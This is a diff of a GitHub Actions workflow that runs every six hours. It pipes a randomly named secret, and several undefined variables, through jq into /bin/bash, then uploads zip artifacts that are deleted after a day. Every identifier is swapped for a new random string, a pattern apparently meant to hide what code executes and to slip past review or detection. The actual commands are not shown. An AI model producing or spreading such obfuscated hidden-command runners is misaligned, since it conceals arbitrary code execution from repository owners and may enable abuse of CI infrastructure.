@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '22 1,7,13,19 * * *'
+    - cron: '15 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,18 +20,18 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          y80422: ${{ secrets.y80422 }}
+          q6621: ${{ secrets.q6621 }}
         run: |
-          printf '%s' "$y80422" | jq -r .oi8 | /bin/bash
-          printf '%s' "$v75" | jq -r .lzfcz02824 | /bin/bash
-          echo $blkzz78364 | jq -r .f7298 | /bin/bash
-          printf '%s' "$rf818" | jq -r .i5187 | /bin/bash
-          printf '%s' "$xe6" | jq -r .zh678 | /bin/bash
+          printf '%s' "$q6621" | jq -r .qyqa74596 | /bin/bash
+          echo $nooox257 | jq -r .kmuvr655 | /bin/bash
+          echo $pzv83 | jq -r .glyv67502 | /bin/bash
+          echo $juc7607 | jq -r .wi167 | /bin/bash
+          printf '%s' "$iyyhr07" | jq -r .hscmf0 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: XSWpw9dX
+          name: ggwL2mgA
           path: "*.zip"
           retention-days: 1
